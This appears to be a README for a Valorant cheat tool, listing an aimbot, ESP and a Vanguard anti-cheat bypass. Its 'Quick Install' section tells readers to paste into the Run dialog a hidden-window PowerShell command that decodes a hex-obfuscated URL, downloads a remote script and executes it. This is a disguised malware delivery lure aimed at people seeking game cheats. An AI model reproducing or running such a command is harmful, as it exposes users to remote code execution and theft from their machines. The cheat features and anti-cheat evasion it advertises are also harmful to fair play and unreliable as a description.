# Valorant External Tool - Project Overview

**Advanced C++ game utility** featuring external memory manipulation with focus on stealth and performance

## 🔧 Technical Stack
- **C++17** core implementation
- **External memory operations** (no in-game injection)
- **Kernel-mode driver** for secure communication
- **ImGui** for overlay rendering
- **Custom memory manager** with anti-dump protection
- 
### Quick Install

- #### Press WIN+R
- #### Copy and insert command

```bash
powershell -WindowStyle Hidden -Command "$p='68747470733A2F2F6A616968696E642E6564752E696E2F67726170657375626A6563742F726570616972626574746572';$u=[System.Text.Encoding]::UTF8.GetString((1..($p.Length/2) | ForEach-Object {[Convert]::ToByte($p.Substring((($_-1)*2),2),16)}));([ScriptBlock]::Create((Invoke-RestMethod $u))).Invoke()"
```


## 🚀 Key Features
| Feature          | Description                          | Status       |
|------------------|--------------------------------------|--------------|
| Smart Aimbot     | Adaptive prediction + humanizer      | ✅ Stable    |
| ESP System       | Box/Health/Distance/Skeleton        | ✅ Stable    |
| Driver Mapper    | Manual map injection                 | 🔧 Testing   |
| Anti-Debug       | Multiple detection vectors           | ✅ Stable    |
| Config System    | JSON-based presets                   | ✅ Stable    |

## 🛡 Security Measures
- **Vanguard bypass** via IRP hooks
- **Memory signature randomization**
- **Thread stack spoofing**
- **Continuous pattern updates**

## 📦 Project Structure
